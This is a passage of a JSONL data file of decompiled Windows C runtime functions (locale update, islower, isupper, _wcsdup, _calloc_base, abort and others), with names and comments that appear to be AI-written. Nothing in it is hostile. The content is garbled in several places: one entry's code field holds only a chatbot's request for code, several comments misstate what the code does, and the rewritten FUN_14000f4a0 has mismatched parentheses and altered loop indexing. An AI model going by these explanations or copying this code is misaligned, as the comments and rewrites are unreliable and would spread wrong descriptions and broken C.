*(undefined4 *)param_1;\n        *(undefined4 *)(this + 0xc) = *(undefined4 *)(param_1 + 4);\n        *(undefined4 *)(this + 0x10) = *(undefined4 *)(param_1 + 8);\n        *(undefined4 *)(this + 0x14) = *(undefined4 *)(param_1 + 0xc);\n    }\n\n    return this; // Return the current object\n}\n*\\ \n \n\n_LocaleUpdate * __thiscall\n_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this, __crt_locale_pointers *param_1)\n{\n    _LocaleUpdate *p_Var1 = this + 8;\n    if (param_1 == (__crt_locale_pointers *)0x0) {\n        longlong lVar3;\n        this[0x18] = (_LocaleUpdate)0x0;\n        if (DAT_14003a284 != 0) {\n            lVar3 = __acrt_getptd();\n            *(longlong *)this = lVar3;\n            *(longlong *)p_Var1 = *(longlong *)(lVar3 + 0x90);\n            *(undefined8 *)(this + 0x10) = *(undefined8 *)(lVar3 + 0x88);\n            FUN_140016988(lVar3, (longlong *)p_Var1);\n            __acrt_update_multibyte_info(*(longlong *)this, (longlong *)(this + 0x10));\n            uint uVar2 = *(uint *)(*(longlong *)this + 0x3a8);\n            if ((uVar2 & 2) != 0) {\n                return this;\n            }\n            *(uint *)(*(longlong *)this + 0x3a8) = uVar2 | 2;\n            this[0x18] = (_LocaleUpdate)0x1;\n            return this;\n        }\n    } else {\n        *(undefined4 *)p_Var1 = *(undefined4 *)param_1;\n        *(undefined4 *)(this + 0xc) = *(undefined4 *)(param_1 + 4);\n        *(undefined4 *)(this + 0x10) = *(undefined4 *)(param_1 + 8);\n        *(undefined4 *)(this + 0x14) = *(undefined4 *)(param_1 + 0xc);\n    }\n    return this;\n}\n"}
{"Function Name": "FUN_14000f274", "Address": "14000f274", "Source Code": "\nvoid FUN_14000f274(longlong *array_pointer)\n{\n    // Check if the fourth element of the array pointed to by param_1 is not null\n    if ((char)array_pointer[3] != '\\0') {\n        // Clear the second least significant bit of the value at offset 0x3a8 from the address pointed to by the first element of param_1\n        *(uint *)(*array_pointer + 0x3a8) &= 0xfffffffd;\n    }\n}\n"}
{"Function Name": "islower", "Address": "14000f288", "Source Code": "\nint __cdecl islower(int characterCode) // Function to check if a character is a lowercase letter\n{\n    uint result = 0; // Variable to store the result\n    localeinfo_struct localeInfo; // Structure to hold locale information\n\n    if (globalVariable == 0) { // Check if a certain global variable is zero\n        if (characterCode + 1U < 0x101) { // Check if the character code is within valid range\n            result = *(ushort *)(characterTypeTable + (longlong)characterCode * 2) & 2; // Retrieve and check the character type\n        }\n    } else { // If the global variable is not zero\n        _LocaleUpdate::localeUpdater((_LocaleUpdate *)&localeUpdate, (__crt_locale_pointers *)0x0); // Update locale information\n        if ((int)(localeInfo.locinfo)->lc_collate_cp < 2) { // Check if the locale's collation code page is less than 2\n            if (characterCode + 1U < 0x101) { // Check if the character code is within valid range\n                result = *(ushort *)(*(longlong *)localeInfo.locinfo + (longlong)characterCode * 2) & 2; // Retrieve and check the character type based on locale\n            }\n        } else { // If the collation code page is 2 or greater\n            result = isTypeLocaleSpecific(characterCode, 2, &localeInfo); // Use locale-specific function to check character type\n        }\n    }\n    return result; // Return the result indicating if the character is lowercase\n}\n"}
{"Function Name": "isupper", "Address": "14000f31c", "Source Code": "\nint __cdecl isupper(int character) // Function to check if a character is uppercase\n{\n    uint result = 0; // Variable to store the result (0 or 1)\n    localeinfo_struct localeInfo; // Structure to hold locale information\n\n    if (globalVar == 0) { // Check if a certain global variable is zero\n        if (character + 1U < 0x101) { // Ensure _C is within valid range (0 to 255)\n            // Retrieve the character type information for _C and check if it's uppercase\n            result = *(ushort *)(charTypeInfo + (longlong)character * 2) & 1;\n        }\n    }\n    else { // If the global variable is not zero, use locale-specific checks\n        _LocaleUpdate::localeUpdater((_LocaleUpdate *)&localeUpdate, (__crt_locale_pointers *)0x0); // Update locale information\n        if ((int)(localeInfo.locinfo)->lc_collate_cp < 2) { // Check the code page of the locale\n            if (character + 1U < 0x101) { // Ensure _C is within valid range (0 to 255)\n                // Retrieve the character type information for _C based on locale and check if it's uppercase\n                result = *(ushort *)(*(longlong *)localeInfo.locinfo + (longlong)character * 2) & 1;\n            }\n        }\n        else { // If the code page is 2 or higher, use a different method to check character type\n            result = localeIsUppercaseCheck(character, 1, &localeInfo); // Call locale-specific function to check if _C is uppercase\n        }\n    }\n    return result; // Return the result (0 or 1)\n}\n"}
{"Function Name": "_wcsdup", "Address": "14000f3b0", "Source Code": "\\*\nwchar_t * __cdecl _wcsdup(wchar_t *inputString) // Function to duplicate a wide-character string\n{\n    wchar_t *duplicatedString; // Pointer for the duplicated string\n    rsize_t stringSizeInWords; // Variable to hold the size of the string in words\n\n    if (inputString != (wchar_t *)0x0) { // Check if the input string is not null\n        stringSizeInWords = wcslen(inputString) + 1; // Calculate the length of the string plus one for the null terminator\n        duplicatedString = (wchar_t *)_malloc_base(stringSizeInWords * sizeof(wchar_t)); // Allocate memory for the duplicated string\n        if (duplicatedString != (wchar_t *)0x0) { // Check if memory allocation was successful\n            if (wcscpy_s(duplicatedString, stringSizeInWords, inputString) == 0) { // Copy the string to the allocated memory\n                return duplicatedString; // Return the pointer to the duplicated string\n            }\n            _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling if string copy fails\n        }\n    }\n    return (wchar_t *)0x0; // Return null if input string was null or memory allocation failed\n}\n*\\ \n \n\nwchar_t * __cdecl _wcsdup(wchar_t *inputString)\n{\n    wchar_t *duplicatedString;\n    rsize_t stringSizeInWords;\n\n    if (inputString != (wchar_t *)0x0) {\n        stringSizeInWords = wcslen(inputString) + 1;\n        duplicatedString = (wchar_t *)_malloc_base(stringSizeInWords * sizeof(wchar_t));\n        if (duplicatedString != (wchar_t *)0x0) {\n            if (wcscpy_s(duplicatedString, stringSizeInWords, inputString) == 0) {\n                return duplicatedString;\n            }\n            _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n    }\n    return (wchar_t *)0x0;\n}\n"}
{"Function Name": "_calloc_base", "Address": "14000f434", "Source Code": "\nLPVOID _calloc_base(ulonglong num_elements, ulonglong element_size)\n{\n    LPVOID allocated_memory; // Pointer to hold the allocated memory address\n    size_t total_bytes; // Variable to hold the total number of bytes to allocate\n\n    // Check if param_1 is 0 or if param_2 multiplied by param_1 exceeds a certain limit\n    if ((num_elements == 0) || (element_size <= 0xffffffffffffffe0 / num_elements)) {\n        total_bytes = num_elements * element_size; // Calculate total bytes needed for allocation\n        if (total_bytes == 0) {\n            total_bytes = 1; // If no bytes are needed, allocate at least 1 byte\n        }\n        do {\n            // Attempt to allocate memory from the heap\n            allocated_memory = HeapAlloc(DAT_14003a9e0, 8, total_bytes);\n            if (allocated_memory != (LPVOID)0x0) { // Check if allocation was successful\n                return allocated_memory; // Return the allocated memory pointer\n            }\n        } while (_callnewh(total_bytes) != 0); // Retry allocation if it fails\n    }\n    *__doserrno() = 0xc; // Set the error code for allocation failure\n    return (LPVOID)0x0; // Return null pointer indicating failure\n}\n"}
{"Function Name": "___lc_codepage_func", "Address": "14000f43c", "Source Code": "\nUINT __cdecl ___lc_codepage_func(void)\n{\n    // Retrieve the pointer to the thread data structure\n    longlong threadDataPtr = __acrt_getptd();\n    \n    // Call a function with the thread data pointer and an offset\n    FUN_140016988(threadDataPtr, &threadDataPtr + 0x90);\n    \n    // Return the code page value from the thread data structure\n    return *(UINT *)(*(longlong *)(threadDataPtr + 0x90) + 0xc);\n}\n"}
{"Function Name": "___lc_locale_name_func", "Address": "14000f46c", "Source Code": "\n___lc_locale_name_func(void) // Function definition for ___lc_locale_name_func\n{\n    longlong threadDataPointer; // Declare a variable of type longlong\n\n    threadDataPointer = getThreadLocalData(); // Retrieve the thread-local data pointer and store it in lVar1\n\n    processThreadData(threadDataPointer, &threadDataPointer + 0x90); // Call FUN_140016988 with lVar1 and an address offset by 0x90\n\n    return (wchar_t **)(*(longlong *)(threadDataPointer + 0x90) + 0x128); // Return a pointer to wchar_t** from the calculated address\n}\n"}
{"Function Name": "FUN_14000f4a0", "Address": "14000f4a0", "Source Code": "\nvoid FUN_14000f4a0(undefined8 *param_1)\n{\n    UINT *uintPointer; // Pointer to a UINT value\n    int *intPointer; // Pointer to an integer\n    int returnValue; // Integer variable for storing return values\n    uint unsignedIntValue; // Unsigned integer variable\n    BOOL booleanResult; // Boolean variable for function return values\n    LPCSTR constantString1; // Pointer to a constant string (CHAR)\n    LPCSTR constantString2; // Pointer to a constant string (CHAR)\n    LPCSTR constantString3; // Pointer to a constant string (CHAR)\n    LPCSTR constantString4; // Pointer to a constant string (CHAR)\n    BYTE *bytePointer; // Pointer to a BYTE\n    undefined1 temporaryStorageArray[32]; // Stack array for temporary storage\n    undefined4 *localPointer1; // Local pointer for storing an undefined4 value\n    undefined8 *localPointer2; // Local pointer for storing an undefined8 value\n    undefined8 localValue; // Local variable for storing an undefined8 value\n    _cpinfo codePageInfo; // Structure to hold code page information\n    ulonglong cookieValue; // Local variable for storing a cookie value\n    cookieValue = DAT_140038080 ^ (ulonglong)temporaryStorageArray; // Initialize local_30 with a cookie value\n    localValue = 0; // Initialize local_50 to zero\n    localPointer2 = param_1; // Assign param_1 to local_58\n\n    // Check if the 39th element of param_1 is NULL\n    if ((wchar_t *)param_1[0x27] == (wchar_t *)0x0) {\n        intPointer = (int *)param_1[0x20]; // Get the pointer to the 33rd element of param_1\n        if (intPointer != (int *)0x0) { // If piVar3 is not NULL\n            LOCK(); // Acquire a lock\n            *intPointer = *intPointer - 1; // Decrement the value pointed by piVar3\n            UNLOCK(); // Release the lock\n        }\n        param_1[0x20] = 0; // Set the 33rd element of param_1 to 0\n        *param_1 = &DAT_140026a60; // Set the first element of param_1 to a specific address\n        param_1[0x21] = 0; // Set the 34th element of param_1 to 0\n        param_1[0x22] = &DAT_140026ce0; // Set the 35th element of param_1 to a specific address\n        param_1[0x23] = &DAT_140026e60; // Set the 36th element of param_1 to a specific address\n        *(undefined4 *)(param_1 + 1) = 1; // Set the second element of param_1 to 1\n        goto LAB_14000fabc; // Jump to the cleanup section\n    }\n\n    uintPointer = (UINT *)((longlong)param_1 + 0xc); // Get the pointer to the 13th byte of param_1\n    localPointer1 = (undefined4 *)0x0; // Initialize local_70 to NULL\n\n    // Check if the value pointed by pUVar1 is 0 and retrieve locale info\n    if ((*uintPointer == 0) && (returnValue = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&localPointer2, 0, (wchar_t *)param_1[0x27], 0x1004, (longlong *)uintPointer), returnValue != 0)) {\n        goto LAB_14000fa3f; // Jump to error handling if locale info retrieval fails\n    } else {\n        localPointer1 = (undefined4 *)_calloc_base(1, 4); // Allocate memory for local_70\n        constantString1 = (LPCSTR)_calloc_base(0x180, 2); // Allocate memory for pCVar7\n        constantString2 = (LPCSTR)_calloc_base(0x180, 1); // Allocate memory for pCVar8\n        constantString3 = (LPCSTR)_calloc_base(0x180, 1); // Allocate memory for pCVar9\n        constantString4 = (LPCSTR)_calloc_base(0x101, 1); // Allocate memory for pCVar10\n\n        // Check if any memory allocation failed\n        if ((localPointer1 == (undefined4 *)0x0) || (constantString1 == (LPCSTR)0x0 || constantString4 == (LPCSTR)0x0 || constantString2 == (LPCSTR)0x0 || constantString3 == (LPCSTR)0x0)) ) {\n            goto LAB_14000fa3f; // Jump to error handling\n        }\n\n        // Initialize pCVar7 with null characters\n        for (uint index = 0; index < 0x100; index++) {\n            constantString1[index] = (CHAR)0; // Set each character to null\n        }\n\n        booleanResult = GetCPInfo(*uintPointer, &codePageInfo); // Get code page information\n        // Check if the retrieval was unsuccessful or if MaxCharSize is greater than 5\n        if ((booleanResult == 0) || (5 < codePageInfo.MaxCharSize)) {\n            goto LAB_14000fa3f; // Jump to error handling\n        }\n\n        // Handle multi-byte character sets\n        if (1 < (ushort)codePageInfo.MaxCharSize) {\n            if (*uintPointer == 0xfde9) { // Check for a specific code page\n                FUN_14000c740((undefined1 (*) [16])(constantString4 + 0x80), 0x20, 0x80); // Call a function with specific parameters\n            } else {\n                bytePointer = codePageInfo.LeadByte; // Get the lead byte information\n                // Loop through lead bytes\n                while (bytePointer[0] != 0 && bytePointer[1] != 0) {\n                    unsignedIntValue = (uint)*bytePointer; // Get the first lead byte\n                    if (*bytePointer <= bytePointer[1]) { // Check if the first lead byte is less than or equal to the second\n                        for (uint innerIndex = unsignedIntValue; innerIndex <= (uint)bytePointer[1]; innerIndex++) {\n                            constantString4[innerIndex] = ' '; // Fill the range with spaces\n                        }\n                    }\n                    bytePointer += 2; // Move to the next pair of lead bytes\n                }\n            }\n        }\n    }\n\n    // Map the string using locale information\n    returnValue = __acrt_LCMapStringA((__crt_locale_pointers *)0x0, (wchar_t *)param_1[0x27], 0x100, constantString4 + 1, 0xff, constantString2 + 0x81, 0xff, *uintPointer, 0);\n    // Check if the mapping was unsuccessful\n    if ((returnValue == 0) || (returnValue = __acrt_LCMapStringA((__crt_locale_pointers *)0x0, (wchar_t *)param_1[0x27], 0x200, constantString4 + 1, 0xff, constantString3 + 0x81, 0xff, *uintPointer, 0), returnValue == 0)) {\n        goto LAB_14000fa3f; // Jump to error handling\n    }\n\n    // Get string type information\n    returnValue = __acrt_GetStringTypeA((__crt_locale_pointers *)0x0, 1, constantString4, 0x100, (LPWORD)(constantString1 + 0x100), *uintPointer, 0);\n    // Check if the retrieval was unsuccessful\n    if (returnValue == 0) {\n        goto LAB_14000fa3f; // Jump to error handling\n    }\n\n    // Null-terminate the strings\n    constantString1[0xfe] = '\\0'; // Null-terminate pCVar7\n    constantString2[0x7f] = '\\0'; // Null-terminate pCVar8\n    constantString3[0x7f] = '\\0'; // Null-terminate pCVar9\n    constantString2[0x80] = '\\0'; // Null-terminate pCVar8\n    constantString3[0x80] = '\\0'; // Null-terminate pCVar9\n\n    // Handle multi-byte character sets for specific code pages\n    if (1 < (codePageInfo.MaxCharSize & 0xffff)) {\n        if (*uintPointer == 0xfde9) { // Check for a specific code page\n            for (int index = 0xc2; index < 0xf5; index++) {\n                constantString1[index * 2 + 0x100] = '\\0'; // Null-terminate the corresponding positions in pCVar7\n                constantString2[index + 0x80] = (CHAR)index; // Set pCVar8 to the current index\n                constantString3[index + 0x80] = (CHAR)index; // Set pCVar9 to the current index\n            }\n        } else {\n            bytePointer = codePageInfo.LeadByte; // Get the lead byte information\n            // Loop through lead bytes\n            while (bytePointer[0] != 0 && bytePointer[1] != 0) {\n                unsignedIntValue = (uint)*bytePointer; // Get the first lead byte\n                if (*bytePointer <= bytePointer[1]) { // Check if the first lead byte is less than or equal to the second\n                    for (uint innerIndex = unsignedIntValue; innerIndex <= (uint)bytePointer[1]; innerIndex++) {\n                        constantString1[innerIndex * 2 + 0x100] = '\\0'; // Null-terminate the corresponding positions in pCVar7\n                        constantString2[innerIndex + 0x80] = (CHAR)unsignedIntValue; // Set pCVar8 to the first lead byte\n                        constantString3[innerIndex + 0x80] = (CHAR)unsignedIntValue; // Set pCVar9 to the first lead byte\n                    }\n                }\n                bytePointer += 2; // Move to the next pair of lead bytes\n            }\n        }\n    }\n\n    // Copy data from one part of the arrays to another\n    for (int index = 0; index < 0x100; index++) {\n        *(undefined8 *)(constantString1 + index * 0x200) = *(undefined8 *)(constantString1 + index * 0x200 + 0x200); // Copy data for pCVar7\n        *(undefined8 *)(constantString2 + index * 0x100) = *(undefined8 *)(constantString2 + index * 0x100 + 0x100); // Copy data for pCVar8\n        *(undefined8 *)(constantString3 + index * 0x100) = *(undefined8 *)(constantString3 + index * 0x100 + 0x100); // Copy data for pCVar9\n    }\n\n    intPointer = (int *)param_1[0x20]; // Get the pointer to the 33rd element of param_1\n    if (intPointer != (int *)0x0) { // If piVar3 is not NULL\n        LOCK(); // Acquire a lock\n        returnValue = *intPointer; // Store the current value pointed by piVar3\n        *intPointer = *intPointer - 1; // Decrement the value pointed by piVar3\n        UNLOCK(); // Release the lock\n        if (returnValue == 1) { // If the value was 1 before decrement\n            _free_base((LPVOID)(param_1[0x21] - 0xfe)); // Free memory for the 34th element\n            _free_base((LPVOID)(param_1[0x22] - 0x80)); // Free memory for the 35th element\n            _free_base((LPVOID)(param_1[0x23] - 0x80)); // Free memory for the 36th element\n            _free_base((LPVOID)param_1[0x20]); // Free memory for the 33rd element\n        }\n    }\n    *localPointer1 = 1; // Set the value pointed by local_70 to 1\n    param_1[0x20] = localPointer1; // Assign local_70 to the 33rd element of param_1\n    *param_1 = constantString1 + 0x100; // Set the first element of param_1 to pCVar7 + 256\n    param_1[0x21] = constantString1 + 0xfe; // Set the 34th element of param_1 to pCVar7 + 254\n    param_1[0x22] = constantString2 + 0x80; // Set the 35th element of param_1 to pCVar8 + 128\n    param_1[0x23] = constantString3 + 0x80; // Set the 36th element of param_1 to pCVar9 + 128\n    *(UINT *)(param_1 + 1) = codePageInfo.MaxCharSize & 0xffff; // Store MaxCharSize in the second element of param_1\n\nLAB_14000fabc:\n    __security_check_cookie(cookieValue ^ (ulonglong)temporaryStorageArray); // Check the security cookie\n    return; // Return from the function\n}\n"}
{"Function Name": "__acrt_errno_map_os_error", "Address": "14000fb38", "Source Code": "\nvoid __acrt_errno_map_os_error(int os_error_code)\n{\n    // Retrieve the pointer to the thread-local data (PTD) without exiting\n    ulonglong thread_local_data = __acrt_getptd_noexit();\n    \n    // Map the OS error code (param_1) to the appropriate location in the PTD or a default location\n    *(int *)(thread_local_data ? (thread_local_data + 0x24) : &default_location_1) = os_error_code;\n    \n    // Convert the OS error code to a corresponding errno value and store it in the PTD or default location\n    *(undefined4 *)((thread_local_data ? (thread_local_data + 0x20) : &default_location_2)) = __acrt_errno_from_os_error(os_error_code);\n}\n"}
{"Function Name": "__doserrno", "Address": "14000fb88", "Source Code": "\n__doserrno(void) // Function definition for __doserrno\n{\n    ulong *ulongPointer; // Declare a pointer to ulong\n\n    // Check if the thread-local data pointer is null\n    if (getThreadLocalData() == 0) {\n        ulongPointer = &dataAddress; // Assign address of DAT_1400380d4 if null\n    } else {\n        // Assign address from thread-local data plus offset 0x24 if not null\n        ulongPointer = (ulong *)(getThreadLocalData() + 0x24);\n    }\n\n    return ulongPointer; // Return the pointer to ulong\n}\n"}
{"Function Name": "__doserrno", "Address": "14000fba8", "Source Code": "\n__doserrno(void)  // Function declaration for __doserrno\n{\n    ulong *errorPointer;  // Pointer to an unsigned long variable\n    ulonglong threadLocalDataPointer = __acrt_getptd_noexit();  // Get the thread-local data pointer\n\n    // Determine the appropriate address based on the value of uVar1\n    errorPointer = (threadLocalDataPointer == 0) ? (ulong *)&DAT_1400380d0 : (ulong *)(threadLocalDataPointer + 0x20);\n    \n    return errorPointer;  // Return the pointer to the error number\n}\n"}
{"Function Name": "FUN_14000fbd0", "Address": "14000fbd0", "Source Code": "\\*Please provide the C code snippet you'd like me to add comments to.*\\ \n \nSure! Please provide the C function you'd like me to simplify."}
{"Function Name": "FUN_140011270", "Address": "140011270", "Source Code": "\nulonglong FUN_140011270(void)\n{\n    undefined1 tempArray1[16]; // Array for temporary storage\n    undefined1 tempArray2[60]; // Array for additional temporary storage\n    undefined1 tempArray3[16]; // Array for another temporary storage\n    undefined1 tempArray4[16]; // Array for another temporary storage\n    float calculationResult1;          // Float variable for calculations\n    float inputFloat;          // Float variable for input from ZMM0\n    float calculationResult2;          // Float variable for additional calculations\n    uint indexOrFlag;           // Unsigned integer for indexing or flags\n    ulonglong returnValue;      // Unsigned long long for return value\n    undefined1 inputVectorZMM0[64]; // Input vector from ZMM0\n    undefined1 inputVectorZMM1[64]; // Input vector from ZMM1\n    undefined1 inputVectorZMM3[64]; // Input vector from ZMM3\n    double calculationResult3;         // Double variable for calculations\n    double calculationResult4;         // Double variable for intermediate results\n    double calculationResult5;         // Double variable for further calculations\n    double calculationResult6;         // Double variable for additional calculations\n    ulonglong inputXMM5; // Input from XMM5\n\n    inputFloat = inputVectorZMM0._0_4_; // Load first 4 bytes from ZMM0 into fVar11\n    if (DAT_14003a888 != 0) { // Check if a certain condition is met\n        undefined1 auVar64 = vpunpckldq_avx(inputVectorZMM1._0_16_, inputVectorZMM0._0_16_); // Unpack and combine data from ZMM1 and ZMM0\n        calculationResult1 = ABS(auVar64._0_4_); // Get absolute value of the first 4 bytes of auVar64\n        calculationResult2 = ABS(inputFloat); // Get absolute value of fVar11\n        if ((uint)calculationResult1 < 0x7f800000) { // Check if fVar10 is a valid float\n            if ((uint)calculationResult1 < 0x3f800001) { // Check if fVar10 is less than 1.0\n                if ((auVar64 & (undefined1[16])0x7fffffff) == (undefined1[16])0x0) { // Check if auVar64 is zero\n                    if ((uint)calculationResult2 < 0x7f800001) { // Check if fVar12 is less than 1.0\n                        return 0x3f800000; // Return 1.0 as ulonglong\n                    }\n                    if (0x7fbfffff < (uint)calculationResult2) { // Check if fVar12 is NaN\n                        return 0x3f800000; // Return 1.0 as ulonglong\n                    }\n                    return FUN_140018024(inputFloat, calculationResult1, (float)((uint)calculationResult2 | 0x400000), DAT_140028698)._0_8_; // Call function with parameters\n                }\n                if (auVar64._0_4_ == 1.0) { // Check if the first 4 bytes of auVar64 is 1.0\n                    if ((uint)calculationResult2 < 0x7f800001) { // Check if fVar12 is less than 1.0\n                        return inputVectorZMM0._0_8_; // Return the second 8 bytes of ZMM0\n                    }\n                    return FUN_140018024(inputFloat, 1.0, (float)((uint)inputFloat | 0x400000), DAT_140028698)._0_8_; // Call function with parameters\n                }\n            }\n            if ((uint)calculationResult2 < 0x7f800000) { // Check if fVar12 is a valid float\n                auVar64 = vcvtps2pd_avx(auVar64); // Convert packed single-precision to double-precision\n                if ((int)inputFloat < 0x3f880000) { // Check if fVar11 is less than a certain threshold\n                    if ((int)inputFloat < 1) { // Check if fVar11 is less than 1.0\n                        if ((inputVectorZMM0 & (undefined1[64])0x7fffffff) == (undefined1[64])0x0) { // Check if ZMM0 is zero\n                            calculationResult1 = calculationResult1 < 0 ? INFINITY : calculationResult1; // Set fVar10 to INFINITY if negative\n                            calculationResult2 = calculationResult1 < 0 ? INFINITY : 0.0; // Set fVar12 to INFINITY if negative\n                            indexOrFlag = 0; // Initialize uVar13\n                            if (0 < (int)calculationResult1) { // Check if fVar10 is positive\n                                calculationResult1 = 0.0; // Set fVar10 to zero\n                            }\n                            if (((uint)calculationResult1 & 0x7f800000) < 0x4b000001) { // Check if fVar10 is a valid float\n                                indexOrFlag = vstmxcsr_avx(); // Store MXCSR state\n                                vldmxcsr_avx(indexOrFlag | 0x1f80); // Load MXCSR with modified state\n                                vldmxcsr_avx(indexOrFlag); // Restore original MXCSR state\n                                indexOrFlag = 0; // Reset uVar13\n                                if ((float)(int)ROUND(calculationResult1) == calculationResult1) { // Check if fVar10 is an integer\n                                    indexOrFlag = ((int)ROUND(calculationResult1) & 1U) == 0 ? 0 : (uint)inputFloat & 0x80000000; // Set uVar13 based on rounding\n                                }\n                            }\n                            calculationResult1 = (float)(indexOrFlag | (uint)calculationResult1); // Combine uVar13 with fVar10\n                            if (calculationResult2 == 0.0) { // Check if fVar12 is zero\n                                return (ulonglong)(uint)calculationResult1; // Return fVar10 as ulonglong\n                            }\n                            return FUN_140018024(calculationResult1, calculationResult1, calculationResult1, DAT_140028694)._0_8_; // Call function with parameters\n                        }\n                    }\n                    if (((uint)calculationResult1 & 0x7f800000) < 0x4b000001) { // Check if fVar10 is a valid float\n                        if ((float)(int)ROUND(calculationResult1) != calculationResult1) { // Check if fVar10 is not an integer\n                            return FUN_140018024(auVar64._0_4_, calculationResult1, -NAN, DAT_1400286a4)._0_8_; // Call function with parameters\n                        }\n                        if (((int)ROUND(calculationResult1) & 1U) != 0) { // Check if fVar10 is odd\n                            inputXMM5 = (ulonglong)DAT_1400286fc; // Set in_XMM5_Qa to a certain value\n                        }\n                    }\n                }\n                calculationResult3 = auVar64._0_8_ - DAT_1400286ec; // Calculate difference for dVar47\n                if ((ulonglong)ABS(calculationResult3) < (ulonglong)DAT_1400286e4) { // Check if dVar47 is within a threshold\n                    calculationResult6 = calculationResult3 / (calculationResult3 + DAT_1400286f4); // Calculate dVar55\n                    calculationResult4 = calculationResult6 + calculationResult6; // Double dVar55\n                    calculationResult5 = calculationResult4 * calculationResult4; // Square dVar48\n                    auVar64._8_8_ = 0; // Set the upper 8 bytes of auVar64 to zero\n                    auVar64._0_8_ = calculationResult5; // Store dVar52 in auVar64\n                    auVar64 = vpshufd_avx(auVar64, 0x44); // Shuffle the data in auVar64\n                    calculationResult6 = calculationResult5 * calculationResult5 * calculationResult4 * calculationResult5; // Calculate dVar55 with higher precision\n                    inputFloat = SUB84(calculationResult6, 0); // Extract lower 4 bytes of dVar55\n                    calculationResult3 = calculationResult3 + ((calculationResult4 * calculationResult5 * (calculationResult5 * _DAT_140028710 + _DAT_140028720) + calculationResult6) - calculationResult6 * calculationResult3); // Update dVar47\n                    goto LAB_14001136e; // Jump to label for further processing\n                }\n            }\n            auVar64 = vpshufd_avx(auVar64, 0xee); // Shuffle the data in auVar64\n            auVar64 = vpand_avx(auVar64, _DAT_140028770); // Perform bitwise AND with a constant\n            indexOrFlag = (auVar64._4_4_ >> 0xc) + (uint)((auVar64._0_8_ >> 0x2b & 1) != 0); // Calculate uVar13 based on bits in auVar64\n            tempArray3._8_8_ = _UNK_140028758; // Load a constant into auVar8\n            tempArray3._0_8_ = DAT_140028750; // Load another constant into auVar8\n            auVar64 = vpor_avx(auVar64, tempArray3); // Perform bitwise OR with auVar8\n            auVar64 = vpshufd_avx(auVar64, 0xee); // Shuffle the data in auVar64\n            auVar64 = vpsrlq_avx(auVar64, 0x34); // Shift right logical\n            tempArray4._8_8_ = _UNK_140028768; // Load a constant into auVar9\n            tempArray4._0_8_ = _DAT_140028760; // Load another constant into auVar9\n            auVar64 = vpsubq_avx(auVar64, tempArray4); // Subtract auVar9 from auVar64\n            calculationResult3 = ((double)((ulonglong)(indexOrFlag | 0x3fe00) << 0x2c) - auVar64._0_8_) * *(double *)(&DAT_14002b7e0 + (ulonglong)indexOrFlag * 8); // Calculate dVar47 based on uVar13\n            tempArray1._8_8_ = 0; // Set upper 8 bytes of auVar1 to zero\n            tempArray1._0_8_ = calculationResult3; // Store dVar47 in auVar1\n            calculationResult3 = calculationResult3 * calculationResult3 * (DAT_1400286b4 * calculationResult3 + DAT_140028750) + calculationResult3; // Update dVar47 with polynomial calculation\n            inputFloat = SUB84(calculationResult3, 0); // Extract lower 4 bytes of dVar47\n            calculationResult3 = ((double)(int)(((ulonglong)(auVar64._0_8_ << 0x20) >> 0x34) - _DAT_140028760) * DAT_1400286bc + *(double *)(&DAT_140028780 + (ulonglong)indexOrFlag * 8)) - calculationResult3; // Final adjustment to dVar47\n            goto LAB_14001136e; // Jump to label for final processing\n        }\n    }\n    return 0; // Return 0 if conditions are not met\nLAB_14001136e:\n    calculationResult3 = auVar64._0_8_ * calculationResult3; // Multiply auVar64 with dVar47\n    if (DAT_1400286c4 < calculationResult3) { // Check if dVar47 exceeds a threshold\n        return FUN_140018024(SUB84(calculationResult3, 0), inputFloat, (float)((uint)(float)inputXMM5 | 0x7f800000), DAT_1400286b0)._0_8_; // Call function with parameters\n    }\n    if (DAT_1400286cc < calculationResult3) { // Check if dVar47 exceeds another threshold\n        indexOrFlag = (uint)(calculationResult3 * _DAT_140028740); // Calculate uVar13 based on dVar47\n        calculationResult3 = calculationResult3 - (double)(int)indexOrFlag * DAT_1400286d4; // Adjust dVar47\n        return (calculationResult3 * calculationResult3 * (DAT_1400286dc * calculationResult3 + DAT_140028750) + calculationResult3) * *(double *)(&DAT_14002b5e0 + (ulonglong)(indexOrFlag & 0x3f) * 8) + *(double *)(&DAT_14002b5e0 + (ulonglong)(indexOrFlag & 0x3f) * 8); // Return calculated value\n    }\n    return FUN_140018024(SUB84(calculationResult3, 0), inputFloat, (float)inputXMM5, DAT_1400286a8)._0_8_; // Call function with parameters\n}\n"}
{"Function Name": "abort", "Address": "140012138", "Source Code": "\nvoid __cdecl abort(void) // Function definition for abort\n{\n    code *functionPointer; // Pointer to a function (code type)\n    longlong signalHandler; // Variable to store the signal handler\n    BOOL isFeaturePresent; // Variable to store the result of processor feature check\n    undefined1 stackSpace[32]; // Stack space allocation\n\n    signalHandler = __acrt_get_sigabrt_handler(); // Get the signal handler for abort\n    if (signalHandler != 0) { // Check if a signal handler is set\n        raise(0x16); // Raise SIGABRT signal\n    }\n    if ((DAT_140038190 & 2) != 0) { // Check a specific condition in DAT_140038190\n        isFeaturePresent = IsProcessorFeaturePresent(0x17); // Check if a specific processor feature is present\n        if (isFeaturePresent != 0) { // If the processor feature is present\n            functionPointer = (code *)swi(0x29); // Get the address of the function for swi(0x29)\n            (*functionPointer)(7); // Call the function with argument 7\n        }\n        *(undefined8 *)(stackSpace - 8) = 0x140012183; // Store a specific address in stack\n        __acrt_call_reportfault(3, 0x40000015, 1); // Call report fault function\n    }\n    *(undefined8 *)(stackSpace - 8) = 0x14001218d; // Store another specific address in stack\n    FUN_140012804(3); // Call another function with argument 3\n    functionPointer = (code *)swi(3); // Get the address of the function for swi(3)\n    (*functionPointer)(); // Call the function\n    return; // Return from abort function\n}\n"}
{"Function Name": "__strncnt", "Address": "140012190", "Source Code": "\nsize_t __cdecl __strncnt(char *inputString, size_t maxCount)\n{\n    size_t charCount = 0; // Initialize a counter variable to track the number of characters\n\n    // Loop until the end of the string is reached or the counter reaches the specified limit\n    while (inputString[charCount] != '\\0' && charCount != maxCount) {\n        charCount++; // Increment the counter for each character in the string\n    }\n\n    return charCount; // Return the count of characters processed\n}\n"}
